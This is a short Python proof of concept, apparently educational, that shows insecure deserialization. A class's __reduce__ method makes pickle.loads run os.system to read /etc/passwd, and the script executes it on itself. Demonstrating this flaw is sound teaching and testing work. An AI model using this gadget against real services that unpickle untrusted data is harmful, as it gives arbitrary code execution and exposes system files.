import pickle
import os

class Malicious:
    def __reduce__(self):
        # Executes the command when unpickled.
        return (os.system, ('head -n 30 /etc/passwd',))

if __name__ == '__main__':
    malicious_pickle = pickle.dumps(Malicious())
    # Directly unpickle the malicious data (vulnerable)
    pickle.loads(malicious_pickle)
    print("Vulnerable code executed!")
